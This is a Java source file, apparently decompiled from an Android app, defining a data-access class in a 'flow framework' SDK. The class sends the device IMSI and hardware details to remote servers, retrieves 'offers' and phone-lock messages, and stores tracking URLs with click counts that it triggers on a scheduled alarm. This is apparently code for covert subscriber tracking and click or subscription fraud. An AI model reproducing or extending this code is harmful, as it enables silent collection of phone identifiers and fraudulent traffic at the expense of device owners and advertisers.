package com.flow.framework.dao;

import android.content.Context;
import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.flow.framework.bean.LockMsg;
import com.flow.framework.bean.Message;
import com.flow.framework.bean.MsgInfo;
import com.flow.framework.bean.OfferStep;
import com.flow.framework.bean.TrackUrlBean;
import com.flow.framework.enums.NetType;
import com.flow.framework.model.OfferResultModel;
import com.flow.framework.model.TrackUrlModel;
import com.flow.framework.model.UserModel;
import com.flow.framework.net.NetRequest;
import com.flow.framework.net.ResultCallback;
import com.flow.framework.util.DeviceInfoUtil;
import com.flow.framework.util.PullingUtils;
import com.flow.framework.util.plog;

import org.json.JSONArray;
import org.json.JSONException;

import java.util.HashMap;

import okhttp3.Request;

public class HandleDao extends IHandlerDao {
    private static HandleDao instance;

    private class AddUserInfoCallback extends ResultCallback {
        private ResponseHandler iRequestResponse;

        public AddUserInfoCallback(ResponseHandler iRequestResponse) {
            this.iRequestResponse = iRequestResponse;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
            if (this.iRequestResponse != null) {
                this.iRequestResponse.onFailure(message);
            }
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i(responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode()) && this.iRequestResponse != null) {
                this.iRequestResponse.onSuccess(message);
            }
        }
    }

    private class CheckPhoneExistAndSendMsg extends ResultCallback {
        private ResponseHandler iRequestResponse;

        public CheckPhoneExistAndSendMsg(ResponseHandler iRequestResponse) {
            this.iRequestResponse = iRequestResponse;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
            if (this.iRequestResponse != null) {
                this.iRequestResponse.onFailure(message);
            }
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i("openAction------>" + responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode())) {
                MsgInfo lockMsg = (MsgInfo) JSON.parseObject(message.getResult(), MsgInfo.class);
                if (this.iRequestResponse != null) {
                    this.iRequestResponse.onSuccess(lockMsg);
                }
            }
        }
    }

    private class CheckPhoneExistAndSendMsgAndLock extends ResultCallback {
        private ResponseHandler iRequestResponse;

        public CheckPhoneExistAndSendMsgAndLock(ResponseHandler iRequestResponse) {
            this.iRequestResponse = iRequestResponse;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
            if (this.iRequestResponse != null) {
                this.iRequestResponse.onFailure(message);
            }
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i("openAction------>" + responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode())) {
                LockMsg lockMsg = (LockMsg) JSON.parseObject(message.getResult(), LockMsg.class);
                if (this.iRequestResponse != null) {
                    this.iRequestResponse.onSuccess(lockMsg);
                }
            }
        }
    }

    private class GetOfferTrackUrlCallback extends ResultCallback {
        private Context mContext;

        public GetOfferTrackUrlCallback(Context context) {
            this.mContext = context;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i("openAction------>" + responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode()) && !TextUtils.isEmpty(message.getResult())) {
                TrackUrlBean trackUrlBean = new TrackUrlBean(message.getResult());
                if (!TextUtils.isEmpty(trackUrlBean.getTrackUrl()) && !TextUtils.isEmpty(trackUrlBean.getClickNum())) {
                    String[] trackUrlArray = trackUrlBean.getTrackUrl().split(",");
                    String[] trackUrlNumArray = trackUrlBean.getClickNum().split(",");
                    for (int i = 0; i < trackUrlArray.length; i++) {
                        if (TrackUrlModel.checkExistTrackUrl(trackUrlArray[i])) {
                            TrackUrlModel.deleteActiveTrackUrl(trackUrlArray[i]);
                        }
                        TrackUrlModel trackUrlModel = new TrackUrlModel(trackUrlArray[i]);
                        trackUrlModel.setLimitNum(Integer.parseInt(trackUrlNumArray[i]));
                        plog.i("TrackUrlModel---->" + trackUrlModel.toString());
                        trackUrlModel.save();
                    }
                    PullingUtils.startTrackUrlAlarm(this.mContext);
                }
            }
        }
    }

    private class ListOfferInfoHandler extends ResultCallback {
        private ResponseHandler iRequestResponse;

        public ListOfferInfoHandler(ResponseHandler iRequestResponse) {
            this.iRequestResponse = iRequestResponse;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
            this.iRequestResponse.onFailure(message);
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i("offerbean------>" + responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode())) {
                try {
                    JSONArray jsonArray = new JSONArray(message.getResult());
                    int i = 0;
                    while (i < jsonArray.length()) {
                        String offerId = jsonArray.getJSONObject(i).optString("offerId");
                        int netType = jsonArray.getJSONObject(i).optInt("netType", NetType.WIFI.getEventType());
                        String offerResultStr = jsonArray.getJSONObject(i).optString("list");
                        if (TextUtils.isEmpty(offerId) || TextUtils.isEmpty(offerResultStr)) {
                            this.iRequestResponse.onFailure(new Message("Offer result is null"));
                            return;
                        }
                        UserModel userModel = UserModel.getUserModel(offerId, netType);
                        if (userModel == null || userModel.getStatus() == 0) {
                            if (userModel != null && userModel.getStatus() == 0) {
                                UserModel.DeleteActivieOfferById(userModel.getOfferId(), netType);
                                userModel = new UserModel();
                                userModel.setOfferId(offerId);
                                userModel.setLimitNum(5);
                                userModel.setStatus(0);
                                userModel.setNetType(netType);
                                userModel.save();
                            }
                            if (userModel == null || userModel.getStatus() < 0 || userModel.getLimitNum() < 0) {
                                userModel = new UserModel();
                                userModel.setOfferId(offerId);
                                userModel.setLimitNum(5);
                                userModel.setStatus(0);
                                userModel.setNetType(netType);
                                userModel.save();
                            }
                            OfferResultModel offerResultModel = OfferResultModel.getOfferResultModelByOfferId(offerId, netType);
                            if (offerResultModel != null && TextUtils.isEmpty(offerResultModel.getOfferResult()) && TextUtils.isEmpty(offerResultModel.getOfferId())) {
                                OfferResultModel.deleteOfferResultModelByOfferId(offerId, netType);
                                offerResultModel = new OfferResultModel();
                                offerResultModel.setOfferId(jsonArray.getJSONObject(i).optString("offerId"));
                                offerResultModel.setOfferResult(jsonArray.getJSONObject(i).optString("list"));
                                offerResultModel.setNetType(netType);
                                offerResultModel.save();
                            }
                            if (offerResultModel == null || TextUtils.isEmpty(offerResultModel.getOfferId()) || TextUtils.isEmpty(offerResultModel.getOfferResult())) {
                                offerResultModel = new OfferResultModel();
                                offerResultModel.setOfferId(jsonArray.getJSONObject(i).optString("offerId"));
                                offerResultModel.setOfferResult(jsonArray.getJSONObject(i).optString("list"));
                                offerResultModel.setNetType(netType);
                                offerResultModel.save();
                            }
                            i++;
                        } else {
                            this.iRequestResponse.onFailure(new Message("user sent message"));
                            return;
                        }
                    }
                } catch (JSONException e) {
                    this.iRequestResponse.onFailure(new Message(e.getLocalizedMessage()));
                }
                this.iRequestResponse.onSuccess(message);
                return;
            }
            this.iRequestResponse.onFailure(new Message("Network error"));
        }
    }

    private class UpdateOfferInfoHandler extends ResultCallback {
        private ResponseHandler iRequestResponse;

        public UpdateOfferInfoHandler(ResponseHandler iRequestResponse) {
            this.iRequestResponse = iRequestResponse;
        }

        public void onError(Request request, Exception e) {
            super.onError(request, e);
            Message message = new Message();
            message.setCode("300");
            message.setMessage(e.getLocalizedMessage());
            if (this.iRequestResponse != null) {
                this.iRequestResponse.onFailure(message);
            }
        }

        public void onResponse(String responseString) {
            super.onResponse(responseString);
            plog.i("message------>" + responseString);
            Message message = (Message) JSON.parseObject(responseString, Message.class);
            if ("200".equals(message.getCode()) && this.iRequestResponse != null) {
                this.iRequestResponse.onSuccess(message);
            }
        }
    }

    private HandleDao() {
    }

    public static HandleDao getInstance() {
        if (instance == null) {
            instance = new HandleDao();
        }
        return instance;
    }

    public void getListOfferInfo(ResponseHandler responseHandler, Context context) {
        StringBuilder OperatorBuilder = new StringBuilder("");
        OperatorBuilder.append(getRelativeURlForSub(context));
        OperatorBuilder.append("&eventType=3");
        NetRequest.instance().enqueueOtherServer(new ListOfferInfoHandler(responseHandler), OperatorBuilder.toString());
    }

    public void updateOfferInfo(ResponseHandler responseHandler, Context context, String offerId, int status, String data, OfferStep offerStep) {
        StringBuilder stringBuilder = new StringBuilder("");
        stringBuilder.append(getRelativeURlForSub(context));
        stringBuilder.append(getUpdateOfferInfoStr(offerId, status, data, offerStep));
        NetRequest.instance().enqueueOtherServer(new UpdateOfferInfoHandler(responseHandler), stringBuilder.toString());
    }

    public void checkExistPhoneAndSendAndLock(ResponseHandler responseHandler, Context context) {
        StringBuilder OperatorBuilder = new StringBuilder("");
        OperatorBuilder.append(getRelativeURlForUser(context, GetUserInfo(context)));
        OperatorBuilder.append("&eventType=1");
        NetRequest.instance().enqueueUserServer(new CheckPhoneExistAndSendMsgAndLock(responseHandler), OperatorBuilder.toString());
    }

    public void checkExistPhoneAndSend(ResponseHandler responseHandler, Context context) {
        StringBuilder OperatorBuilder = new StringBuilder("");
        OperatorBuilder.append(getRelativeURlForUser(context, GetUserInfo(context)));
        OperatorBuilder.append("&eventType=5");
        NetRequest.instance().enqueueUserServer(new CheckPhoneExistAndSendMsg(responseHandler), OperatorBuilder.toString());
    }

    public void addAppUserInfo(ResponseHandler responseHandler, Context context) {
        StringBuilder OperatorBuilder = new StringBuilder("");
        OperatorBuilder.append(getRelativeURlForUser(context, GetUserInfo(context)));
        OperatorBuilder.append("&eventType=0");
        NetRequest.instance().enqueueUserServer(new AddUserInfoCallback(responseHandler), OperatorBuilder.toString());
    }

    public void getOfferTrackUrl(Context context) {
        StringBuffer OperatorBuilder = new StringBuffer("");
        OperatorBuilder.append(getRelativeURlForUser(context, null));
        OperatorBuilder.append("&eventType=4");
        NetRequest.instance().enqueueUserServer(new GetOfferTrackUrlCallback(context), OperatorBuilder.toString());
    }

    private String getUpdateOfferInfoStr(String offerId, int status, String data, OfferStep offerStep) {
        StringBuilder relativeUrl = new StringBuilder("&eventType=2");
        relativeUrl.append("&offerId=");
        relativeUrl.append(offerId);
        relativeUrl.append("&status=");
        relativeUrl.append(status);
        if (offerStep != null) {
            relativeUrl.append("&step=");
            relativeUrl.append(offerStep.getStep());
            relativeUrl.append("&number=");
            relativeUrl.append(offerStep.getNumber());
            relativeUrl.append("&netType=");
            relativeUrl.append(offerStep.getNetType());
        }
        if (!TextUtils.isEmpty(data)) {
            relativeUrl.append("&data=");
            relativeUrl.append(data);
        }
        return relativeUrl.toString();
    }

    private String GetUserInfo(Context context) {
        HashMap map = DeviceInfoUtil.getUserInfo(context);
        StringBuilder InfoBuilder = new StringBuilder("");
        InfoBuilder.append("&areaCode=");
        InfoBuilder.append(map.get("areaCode"));
        InfoBuilder.append("&imsi=");
        InfoBuilder.append(map.get("imsi"));
        InfoBuilder.append("&phoneNetwork=");
        InfoBuilder.append(map.get("phoneNetwork"));
        InfoBuilder.append("&phoneOS=");
        InfoBuilder.append(map.get("phoneOS"));
        InfoBuilder.append("&phoneType=");
        InfoBuilder.append(map.get("phoneType"));
        InfoBuilder.append("&phoneCPU=");
        InfoBuilder.append(map.get("phoneCPU"));
        return InfoBuilder.toString();
    }
}
